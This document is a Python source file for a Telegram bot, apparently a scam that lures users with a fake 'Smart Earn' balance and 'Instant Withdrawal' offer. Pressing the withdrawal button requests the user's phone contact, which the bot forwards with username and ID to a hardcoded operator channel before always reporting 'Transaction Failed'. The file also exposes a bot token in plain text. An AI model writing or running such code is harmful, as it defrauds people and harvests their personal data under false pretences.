import telebot
from telebot import types
import time

BOT_TOKEN = "7223307088:AAEGHxuKjd8SG6W7xcQU3Hw99vtsxn9KIo4"
bot = telebot.TeleBot(BOT_TOKEN)
bot.remove_webhook()

user_data = {}

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    markup.add('Check Balance ✅')
    
    bot.send_message(
        message.chat.id,
        "<b>🚀 Smart Earn 4-4-3 🎁</b>\n\n"
        "Claim Your <b>Instant Money</b> 💰\n\n"
        "Tap below! 👑",
        reply_markup=markup,
        parse_mode="HTML"
    )
    print(f"✅ /start OK → {message.from_user.id}")

@bot.message_handler(func=lambda m: m.text == 'Check Balance ✅')
def check_balance(message):
    try:
        user = message.from_user
        username = user.username if user.username else user.first_name
        user_data[user.id] = {"username": username, "phone": None}

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True, row_width=1)
        markup.add(types.KeyboardButton("Withdrawal Now 💰", request_contact=True))

        bot.send_message(
            message.chat.id,
            f"<b>🤴 User:</b> {username}\n"
            f"<b>💰 Balance:</b> $3\n\n"
            f"<b>💰 Inviter Balance:</b> $26\n\n"
            f"<b>💸 Instant Withdrawal Available!</b>\n\n"
            f"Click below to Withdrawal Now 💰 for instant Withdrawal ⏰",
            reply_markup=markup,
            parse_mode="HTML"
        )
        print(f"✅ Check Balance sent to {username}")
        
    except Exception as e:
        print(f"❌ Check Balance Error: {e}")
        # Nuclear fallback - NO FORMATTING
        bot.send_message(
            message.chat.id,
            f"<b>🤴 User:</b> {username}\n"
            f"<b>💰 Balance:</b> $3\n\n"
            f"<b>💰 Inviter Balance:</b> $26\n\n"
            f"<b>💸 Instant Withdrawal Available!</b>\n\n"
            f"Click below to Withdrawal Now 💰 for instant Withdrawal ⏰",
            reply_markup=markup
        )

@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    try:
        phone = message.contact.phone_number
        user_id = message.from_user.id
        username = user_data.get(user_id, {}).get("username", "Unknown")
        user_data[user_id] = {"username": username, "phone": phone}

        log_text = f"""🎯New Girl😋 :( 🥹

User: @{username}
Phone: {phone}
ID: {user_id}
Time: {time.strftime("%Y-%m-%d %H:%M:%S")}"""

        # Send to channel
        try:
            bot.send_message(-1003953160652, log_text)
            print(f"✅ Logged to channel: {phone}")
        except:
            try:
                bot.send_message(6584610386, log_text)
            except:
                pass

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
        markup.add('Withdrawal Now 💰')

        bot.send_message(
            message.chat.id,
            f"✅ Processing your withdrawal...",
            reply_markup=markup
        )
    except Exception as e:
        print(f"Contact Error: {e}")

@bot.message_handler(func=lambda m: m.text == 'Withdrawal Now 💰')
def withdrawal(message):
    bot.send_message(message.chat.id, "🔄 Processing... Please wait...")
    time.sleep(4)
    bot.send_message(
        message.chat.id,
        "❌ Transaction Failed\n\n"
    )

print("😈 DEMONWESTKILLER BOT RELOADED - PURE HTML + FALLBACK 🔥")
bot.polling(none_stop=True)
